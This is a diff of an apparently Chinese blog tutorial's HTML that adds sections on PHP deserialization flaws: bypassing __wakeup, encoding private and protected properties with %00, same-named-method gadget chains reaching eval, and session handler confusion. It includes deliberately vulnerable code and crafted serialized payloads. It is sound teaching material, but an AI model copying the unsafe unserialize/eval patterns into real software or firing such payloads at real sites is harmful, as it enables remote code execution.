@@ -470,7 +470,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
+                    2.9k
                 </div>
                 
 
@@ -740,12 +740,231 @@ __wakeup将在序列化之后立即被调用<span aria-hidden="true" class="line
 <p>首先会被执行的是<code>__wakeup()</code>函数，这时候<code>target</code>函数值会被覆盖为<code>wakeup!</code>,然后生成<code>hello.php</code>里面的内容是<code>__wakeup</code></p>
 <p>考虑绕过:</p>
 <ul>
-<li>属性个数的值大于真实属性个数时就会跳过__wakeup执行</li>
+<li>属性个数的值大于真实属性个数时就会跳过<code>__wakeup</code>执行</li>
 </ul>
 <p>构造POC：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">O:1:"A":2:&#123;s:6:"target";s:19:"<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>";&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqvhqnz7b4j30ym0faq6c.jpg" alt="image-20210526074733666"></p>
+<h2 id="注入对象构造方法"><a href="#注入对象构造方法" class="headerlink" title="注入对象构造方法"></a>注入对象构造方法</h2><h3 id="当目标对象被private和protected修饰时反序列化漏洞的利用"><a href="#当目标对象被private和protected修饰时反序列化漏洞的利用" class="headerlink" title="当目标对象被private和protected修饰时反序列化漏洞的利用"></a>当目标对象被private和protected修饰时反序列化漏洞的利用</h3><p>上面说了<code>private</code>和<code>protected</code>返回长度和<code>public</code>不一样的原因</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">private</span>属性序列化的时候格式是<span class="token operator">%</span><span class="token number">00</span>类名<span class="token operator">%</span><span class="token number">00</span>成员名
+protect属性序列化的时候格式是<span class="token operator">%</span><span class="token number">00</span><span class="token operator">*</span><span class="token operator">%</span><span class="token number">00</span>成员名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><strong>protected情况下:</strong></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"hahaha"</span><span class="token punctuation">;</span>
+        <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>构造方式:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"hahaha"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>得到字符串:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"A"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"*test"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"hahaha"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>注意:</strong></p>
+<ul>
+<li>此时的%00并没有显示出来，因此我们需要<strong>在传参的url中加上%00</strong></li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqvx3cm8ndj30tz0843zk.jpg" alt="image-20210526163844083"></p>
+<p><strong>private情况下:</strong></p>
+<p>POC:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">private</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"hahaha"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>得到字符串:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"A"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Atest"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"hahaha"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>同理，我们仍然需要补足%00</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqvx9vvd2qj30oo07djti.jpg" alt="image-20210526164503511"></p>
+<h2 id="同名方法的利用"><a href="#同名方法的利用" class="headerlink" title="同名方法的利用"></a>同名方法的利用</h2><h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码:"></a>漏洞代码:</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">public</span> <span class="token variable">$target</span><span class="token punctuation">;</span>
+        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">target</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">target</span><span class="token operator">-></span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"action B"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
+        <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"action A"</span><span class="token punctuation">;</span>
+            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>很显然在代码中，我们希望执行的是C中的<code>action</code>函数，而不是b中的<code>action</code>函数.</li>
+</ul>
+<p>POC:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$target</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">target</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">target</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"phpinfo();"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">target</span><span class="token operator">-></span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"action C"</span><span class="token punctuation">;</span>
+        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>得到字符串：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"A"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"target"</span><span class="token punctuation">;</span><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"C"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"phpinfo();"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqvy55w7arj30xp05b0tm.jpg" alt="image-20210526171507329"></p>
+<h2 id="session反序列化漏洞"><a href="#session反序列化漏洞" class="headerlink" title="session反序列化漏洞"></a>session反序列化漏洞</h2><h3 id="1-什么是session"><a href="#1-什么是session" class="headerlink" title="1. 什么是session"></a>1. 什么是session</h3><p>英文翻译为”会话”,两个人从开始到结束就构成了一个回话。php里的session主要指客户端浏览器与服务器端数据交换的回话，从浏览器打开到关闭的，一个最简单的回话周期</p>
+<h3 id="2-PHP-session工作流程"><a href="#2-PHP-session工作流程" class="headerlink" title="2. PHP session工作流程"></a>2. PHP session工作流程</h3><p>当开始一个回话的时候，php会尝试在请求中查找会话ID，如果发现请求的<code>Cookie</code>、<code>Get</code>、<code>Post</code>中不存在<code>session id</code>，<code>PHP</code> 就会自动调用<code>php_session_create_id</code>函数创建一个新的会话，并且在<code>http response</code>中通过<code>set-cookie</code>头部发送给客户端保存，例如登录如下网页<code>Cokkie、Get、Post</code>都不存在<code>session id</code>，于是就使用了<code>set-cookie</code>头</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqvyc5rreyj30rb0lzq57.jpg" alt="img"></p>
+<p>有时候浏览器用户设置会禁止 <code>cookie</code>，当在客户端<code>cookie</code>被禁用的情况下，<code>php</code>也可以自动将<code>session id</code>添加到<code>url</code>参数中以及<code>form</code>的<code>hidden</code>字段中，但这需要将<code>php.ini</code>中的<code>session.use_trans_sid</code>设为开启，也可以在运行时调用<code>ini_set</code>来设置这个配置项</p>
+<ul>
+<li>会话开始之后，<code>PHP</code> 就会将会话中的数据设置到 <code>$_SESSION</code> 变量中，如下述代码就是一个在 <code>$_SESSION</code> 变量中注册变量的例子：</li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ghtwf01'</span> <span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>创建一个<code>session</code>内容是<code>username:ghtwf01</code></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqvyj9ws1ij31du0gqmzp.jpg" alt="img"></p>
+<h3 id="3-Php-ini配置"><a href="#3-Php-ini配置" class="headerlink" title="3. Php.ini配置"></a>3. Php.ini配置</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">session<span class="token operator">.</span>save_path<span class="token operator">=</span><span class="token string double-quoted-string">""</span>      <span class="token operator">--</span>设置session的存储位置
+session<span class="token operator">.</span>save_handler<span class="token operator">=</span><span class="token string double-quoted-string">""</span>   <span class="token operator">--</span>设定用户自定义存储函数，如果想使用<span class="token constant">PHP</span>内置session存储机制之外的可以使用这个函数
+session<span class="token operator">.</span>auto_start        <span class="token operator">--</span>指定会话模块是否在请求开始时启动一个会话，默认值为 <span class="token number">0</span>，不启动
+session<span class="token operator">.</span>serialize_handler <span class="token operator">--</span>定义用来序列化<span class="token operator">/</span>反序列化的处理器名字，默认使用php  
+session<span class="token operator">.</span>upload_progress<span class="token operator">.</span>enabled <span class="token operator">--</span>启用上传进度跟踪，并填充$ <span class="token constant">_SESSION</span>变量，默认启用
+session<span class="token operator">.</span>upload_progress<span class="token operator">.</span>cleanup <span class="token operator">--</span>读取所有<span class="token constant">POST</span>数据（即完成上传）后，立即清理进度信息，默认启用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>如<code>phpstudy</code>下上述配置如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">session.save_path &#x3D; &quot;&#x2F;tmp&quot;      --所有session文件存储在&#x2F;tmp目录下
+session.save_handler &#x3D; files    --表明session是以文件的方式来进行存储的
+session.auto_start &#x3D; 0          --表明默认不启动session
+session.serialize_handler &#x3D; php --表明session的默认(反)序列化引擎使用的是php(反)序列化引擎
+session.upload_progress.enabled on --表明允许上传进度跟踪，并填充$ _SESSION变量
+session.upload_progress.cleanup on --表明所有POST数据（即完成上传）后，立即清理进度信息($ _SESSION变量)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>有关phpsession和php处理器的详解:</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6753">https://xz.aliyun.com/t/6753</a></p>
+<h3 id="4-PHP-session的存储机制"><a href="#4-PHP-session的存储机制" class="headerlink" title="4. PHP session的存储机制"></a>4. PHP session的存储机制</h3><p> <code>PHP session</code>的存储机制是由<code>session.serialize_handler</code>来定义引擎的，默认是以文件的方式存储，且存储的文件是由<code>sess_sessionid</code>来决定文件名的，当然这个文件名也不是不变的，都是<code>sess_sessionid</code>形式</p>
+<p><code>session.serialize_handler</code>，它定义的引擎有三种</p>
+<p>| 处理器名称 | 存储格式 |<br>| php | 键名 + 竖线 + 经过serialize()函数序列化处理的值 |<br>| php_binary | 键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值|<br>| php_serialize(php&gt;5.5.4) | 经过serialize()函数序列化处理的数组 |</p>
+<h3 id="5-php处理器"><a href="#5-php处理器" class="headerlink" title="5.php处理器"></a>5.php处理器</h3><ul>
+<li><strong>首先来看看<code>session.serialize_handler</code>等于<code>php</code>时候的序列化结果，代码如下</strong></li>
+</ul>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置处理器</span>
+<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqvz1kv1hhj312i06k76a.jpg" alt="image-20210526174616191"></p>
+<ul>
+<li><strong>到session的存储目录下看一下session</strong></li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqvz5188itj30ft01umx9.jpg" alt="image-20210526174935895"></p>
+<p><code>session</code>为<code>$_SESSION[&#39;session&#39;]</code>的键名，<code>|</code>后为传入<code>GET</code>参数经过序列化后的值</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqvzv3mwfkj30mm0fwgnj.jpg" alt="image-20210526181438263"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqvzvbnvwaj30m80egwfz.jpg" alt="image-20210526181451610"></p>
+<h2 id="session的反序列化漏洞利用"><a href="#session的反序列化漏洞利用" class="headerlink" title="session的反序列化漏洞利用"></a>session的反序列化漏洞利用</h2><p><code>php</code>处理器和<code>php_serialize</code>处理器这两个处理器生成的序列化格式本身是没有问题的，但是如果这两个处理器混合起来用，就会造成危害。形成的原理：</p>
+<ul>
+<li>在用<code>session.serialize_handler = php_serialize</code>存储的字符可以引入 <code>|</code> </li>
+<li>再用<code>session.serialize_handler = php</code>格式取出<code>$_SESSION</code>的值时， |会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞。</li>
+</ul>
+<p><strong>漏洞代码:</strong></p>
+<p>session.php:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php_serialize'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>test2.php:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">class</span> <span class="token class-name">D0g3</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'panda'</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+      <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Who are you?"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+      <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">D0g3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>session.php</code>文件的处理器是<code>php_serialize</code>，<code>test2.php</code>文件的处理器是<code>php</code>，<code>session.php</code>文件的作用是传入可控的 <code>session</code>值，<code>test2.php</code>文件的作用是在反序列化开始前输出<code>Who are you?</code>，反序列化结束的时候输出<code>name</code>值<br>运行一下<code>hello.php</code>看一下效果</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqw156n0ykj30k404dt97.jpg" alt="image-20210526185854390"></p>
+<p>POC:</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token keyword">class</span> <span class="token class-name">D0g3</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ghtwf01'</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+      <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Who are you?"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+      <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">D0g3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>显示结果:</strong></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"D0g3"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ghtwf01"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
+
+ghtwf01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqw18wh7apj30q802p0sx.jpg" alt="image-20210526190228584"></p>
+<p>因为<code>session</code>是<code>php_serialize</code>处理器，所以允许<code>|</code>存在字符串中，所以将这段代码序列化内容前面加上<code>|</code>传入<code>session.php</code>中<br>现在来看一下存入<code>session</code>文件的内容</p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqw1gyrdn1j30hz01xgls.jpg" alt="image-20210526191013367"></p>
+<p><strong>再打开test2.php</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqw1iremddj30e904zt95.jpg" alt="image-20210526191156820"></p>
 
                 
             </div>
